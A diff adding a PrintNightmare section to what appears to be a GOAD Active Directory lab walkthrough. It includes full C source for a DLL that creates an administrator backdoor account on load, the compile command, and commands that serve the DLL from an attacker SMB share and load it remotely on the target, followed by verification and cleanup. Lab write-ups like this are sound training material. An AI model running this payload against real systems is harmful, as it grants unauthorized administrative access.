@@ -900,6 +900,109 @@ impacket-psexec<span class="w"> </span>-k<span class="w"> </span>-no-pass<span c
 <div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span>meereen.essos.local<span class="w"> </span>-u<span class="w"> </span><span class="s1">'khal.drogo'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'horse'</span><span class="w"> </span>-M<span class="w"> </span>printnightmare
 </code></pre></div>
 <p><img alt="essos-printnightmare-check.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-printnightmare-check.png"/></p>
+<p>Create a DLL that will create a backdoor user:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#pragma comment(lib, "Netapi32.lib")</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span><span class="c1"> </span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;lm.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">AddUserToWindows</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">USER_INFO_1</span><span class="w"> </span><span class="n">ui</span><span class="p">;</span>
+<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">dwError</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// Initialize user information</span>
+<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LPWSTR</span><span class="p">)</span><span class="n">username</span><span class="p">;</span>
+<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LPWSTR</span><span class="p">)</span><span class="n">password</span><span class="p">;</span>
+<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_priv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">USER_PRIV_USER</span><span class="p">;</span><span class="w">  </span><span class="c1">// Standard user (not admin by default)</span>
+<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_home_dir</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_comment</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UF_SCRIPT</span><span class="p">;</span><span class="w"> </span><span class="c1">// Default user settings</span>
+<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_script_path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// Add user</span>
+<span class="w">    </span><span class="n">NET_API_STATUS</span><span class="w"> </span><span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NetUserAdd</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">LPBYTE</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ui</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">dwError</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">status</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">NERR_Success</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">"User '%s' added successfully.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">"Failed to add user. Error code: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">status</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">AddUserToGroup</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="n">group</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">LOCALGROUP_MEMBERS_INFO_3</span><span class="w"> </span><span class="n">lgmi</span><span class="p">;</span>
+<span class="w">    </span><span class="n">lgmi</span><span class="p">.</span><span class="n">lgrmi3_domainandname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LPWSTR</span><span class="p">)</span><span class="n">username</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// Add user to the specified group</span>
+<span class="w">    </span><span class="n">NET_API_STATUS</span><span class="w"> </span><span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NetLocalGroupAddMembers</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">group</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">LPBYTE</span><span class="p">)</span><span class="o">&amp;</span><span class="n">lgmi</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">status</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">NERR_Success</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">"User '%s' added to group '%s' successfully.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">group</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">"Failed to add user to group '%s'. Error code: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">group</span><span class="p">,</span><span class="w"> </span><span class="n">status</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">doSomeAction</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sa">L</span><span class="s">"jack"</span><span class="p">;</span><span class="w">  </span><span class="c1">// Change this to the desired username</span>
+<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sa">L</span><span class="s">"password"</span><span class="p">;</span><span class="w"> </span><span class="c1">// Change to a secure password</span>
+<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="n">group</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sa">L</span><span class="s">"Administrators"</span><span class="p">;</span><span class="w">   </span><span class="c1">// Add user to Administrators group</span>
+
+<span class="w">    </span><span class="c1">// Add the user</span>
+<span class="w">    </span><span class="n">AddUserToWindows</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// Add user to the "Administrators" group</span>
+<span class="w">    </span><span class="n">AddUserToGroup</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">group</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">BOOL</span><span class="w"> </span><span class="n">APIENTRY</span><span class="w"> </span><span class="n">DllMain</span><span class="p">(</span><span class="n">HMODULE</span><span class="w"> </span><span class="n">hModule</span><span class="p">,</span>
+<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">ul_reason_for_call</span><span class="p">,</span>
+<span class="w">    </span><span class="n">LPVOID</span><span class="w"> </span><span class="n">lpReserved</span>
+<span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_PROCESS_ATTACH</span><span class="p">:</span>
+<span class="w">        </span><span class="n">doSomeAction</span><span class="p">();</span>
+<span class="w">        </span><span class="k">break</span><span class="p">;</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_THREAD_ATTACH</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_THREAD_DETACH</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_PROCESS_DETACH</span><span class="p">:</span>
+<span class="w">        </span><span class="k">break</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>Compile the DLL:</p>
+<div class="highlight"><pre><span></span><code>x86_64-w64-mingw32-gcc<span class="w"> </span>-shared<span class="w"> </span>-o<span class="w"> </span>test.dll<span class="w"> </span>exploit.c<span class="w"> </span>-lnetapi32
+</code></pre></div>
+<p>Start a SMB server with Impacket's <code>smbserver</code> and use <code>PrintNightmare</code> to remotely install the DLL:</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>impacket-smbserver<span class="w"> </span>-smb2support<span class="w"> </span>myshare<span class="w"> </span>./
+
+python3<span class="w"> </span>printnightmare.py<span class="w"> </span>-dll<span class="w"> </span><span class="s1">'\\10.1.0.4\myshare\test.dll'</span><span class="w"> </span><span class="s1">'khal.drogo:horse@meereen.essos.local'</span>
+</code></pre></div>
+<p><img alt="essos-printnightmare-exploit.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-printnightmare-exploit.png"/></p>
+<p><img alt="essos-printnightmare-smbserver.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-printnightmare-smbserver.png"/></p>
+<p>Check installed DLLs:</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>printnightmare.py<span class="w"> </span>-list<span class="w"> </span><span class="s1">'khal.drogo:horse@meereen.essos.local'</span>
+</code></pre></div>
+<p><img alt="essos-printnightmare-list-drivers.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-printnightmare-list-drivers.png"/></p>
+<p>Check if the attack was successful:</p>
+<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span>meereen.essos.local<span class="w"> </span>-u<span class="w"> </span><span class="s1">'jack'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'password'</span><span class="w"> </span>-x<span class="w"> </span>whoami
+</code></pre></div>
+<p><img alt="essos-printnightmare-user-created.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-printnightmare-user-created.png"/></p>
+<p>Cleanup drivers:</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>printnightmare.py<span class="w"> </span>-delete<span class="w"> </span>-name<span class="w"> </span><span class="s1">'Microsoft XPS Document Writer v5'</span><span class="w"> </span><span class="s1">'jack:password@meereen.essos.local'</span>
+python3<span class="w"> </span>printnightmare.py<span class="w"> </span>-list<span class="w"> </span><span class="s1">'jack:password@meereen.essos.local'</span>
+</code></pre></div>
+<p><img alt="essos-printnightmare-cleanup-driver.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-printnightmare-cleanup-driver.png"/></p>
+<p>Cleanup user:</p>
+<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span>meereen.essos.local<span class="w"> </span>-u<span class="w"> </span><span class="s1">'jack'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'password'</span><span class="w"> </span>-x<span class="w"> </span><span class="s1">'net user jack /delete'</span>
+</code></pre></div>
+<p><img alt="essos-printnightmare-cleanup-user.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/essos-printnightmare-cleanup-user.png"/></p>
 <h2 id="mssql-abuse_1">MSSQL Abuse</h2>
 <p>Connect to <code>CASTELBLACK.NORTH.SEVENKINGDOMS.LOCAL</code> with Impacket's <code>mssqlclient</code>:</p>
 <div class="highlight"><pre><span></span><code>impacket-mssqlclient<span class="w"> </span>north.sevenkingdoms.local/samwell.tarly:Heartsbane@castelblack.north.sevenkingdoms.local<span class="w"> </span>-windows-auth
